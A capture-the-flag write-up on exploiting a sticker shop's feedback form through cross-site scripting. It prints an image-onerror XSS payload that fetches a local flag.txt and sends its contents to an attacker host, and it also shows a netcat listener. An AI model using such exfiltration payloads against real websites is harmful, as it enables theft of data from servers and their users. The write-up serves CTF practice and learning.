# The Sticker Shop 
**Can you exploit the sticker shop in order to capture the flag?**

Starting task, as we are going to face with a server run by a Local Sticker Shop hosted. I started the machine and jump over it.

The first step I took is to visit the website and looked for the source and found ``/submit_feedback`` dir, which catched me.

And I visited to **``/submit_feedback``** and found a submition functionality available.

As soon I saw this, I just started to try random XSS payloads, from [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list), and cam to this payload..

```js
<img src=x onerror="fetch('<ip>:8080')"/>
```
>[!NOTE]
> In the above payload an image would be loaded as img tag refers to **X** location, since the src fail to load and it simply goes to execute following and we just can grap the http request using ``nc``
>```js
> fetch('http://<ip>:8080');
>```
And I just ``nc`` the headers before the submition of the payload, and yeah like this !!!
```bash
nc -knvlp 8080
```

Now to grab the flag I have used the following payload..


```js
<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://<ip>:8080/?c=' + r)).catch(e => fetch('http://<ip>:8080/?c=' + e))"/>
```
>[!NOTE]
> Componenets..
* ```<img src="x" onerror="...">```  - The image ``src`` is invalid, causing the ``onerror`` attribute to execute when the browser fails to load the image. 
* ```fetch('http://127.0.0.1:8080/flag.txt')``` - This initiates an HTTP GET request to the victim's localhost at port 8080, targeting the ``flag.txt`` file.
* ```.then(r => r.text())``` - If the request succeeds, this processes the response (``r``) and converts it into text using the ``.text()`` method.
* ```.then(r => fetch('http://<ip>:8080/?c=' + r))``` - After retrieving the file content, another ``fetch`` request sends the content (``r``) to the attacker's server (``http://<ip>:8080``) as part of the query string (``?c=...``).
* ```.catch(e => fetch('http://<ip>:8080/?c=' + e))``` - If the initial ``fetch`` fails (e.g., the file doesn't exist or CORS blocks the request), the ``catch`` block handles the error and sends the error message (``e``) to the attacker's server.
